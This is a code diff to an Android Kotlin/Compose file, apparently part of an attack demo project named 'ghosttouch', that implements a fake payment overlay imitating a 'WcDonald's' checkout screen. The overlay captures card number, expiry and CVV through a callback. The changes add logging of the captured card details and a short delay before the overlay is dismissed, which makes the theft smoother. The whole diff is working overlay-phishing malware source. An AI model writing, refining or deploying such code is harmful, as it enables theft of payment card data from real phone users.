@@ -1,5 +1,6 @@
 package com.ghosttouch.attacker.overlay
 
+import android.util.Log
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.RoundedCornerShape
@@ -17,6 +18,8 @@ import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.input.KeyboardType
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 
 /**
  * Fake payment overlay that mimics the WcDonald's payment screen.
@@ -41,6 +44,7 @@ fun FakePaymentOverlay(
     var expiry by remember { mutableStateOf("") }
     var cvv by remember { mutableStateOf("") }
     var cardHolder by remember { mutableStateOf("") }
+    val coroutineScope = rememberCoroutineScope()
 
     Box(
         modifier = Modifier
@@ -160,8 +164,15 @@ fun FakePaymentOverlay(
 
                 Button(
                     onClick = {
-                        onPaymentCaptured(cardNumber, expiry, cvv)
-                        onDismiss()
+                        val capturedCard = cardNumber
+                        val capturedExpiry = expiry
+                        val capturedCvv = cvv
+                        Log.d("FakePaymentOverlay", "Capturing: card=*${capturedCard.takeLast(4)}, exp=$capturedExpiry")
+                        onPaymentCaptured(capturedCard, capturedExpiry, capturedCvv)
+                        coroutineScope.launch {
+                            delay(500)
+                            onDismiss()
+                        }
                     },
                     modifier = Modifier
                         .fillMaxWidth()
